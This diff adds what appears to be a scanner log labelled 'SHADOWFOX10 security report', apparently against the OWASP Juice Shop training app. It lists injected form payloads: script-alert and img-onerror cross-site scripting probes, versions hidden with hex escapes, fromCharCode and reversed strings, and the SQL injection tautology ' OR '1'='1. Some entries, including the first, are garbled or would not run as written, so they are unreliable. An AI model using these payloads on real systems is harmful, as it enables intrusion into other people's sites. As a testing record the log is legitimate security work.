@@ -1,0 +1,30 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: juice-shop.herokuapp.com?q=<form action='
+
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='e3x\92x\72x\37x\37x\87x\72x\82x\47x\27x\56x\c6x\16x\d3x\27x\f6x\27x\27x\56x\e6x\f6x\02x\87x\d3x\36x\27x\37x\02x\76x\d6x\96x\c3x\'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='<script>alert(1)</script>'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='\x27\x20\x4f\x52\x20\x27\x31\x27\x3d\x27\x31'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='>tpircs/<)1(trela>tpircs<'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='eval(String.fromCharCode(62,116,112,105,114,99,115,47,60,41,49,40,116,114,101,108,97,62,116,112,105,114,99,115,60))'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='eval(String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,39,120,115,115,39,41,62))'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='eval(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='' OR '1'='1'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e'></form>
+---
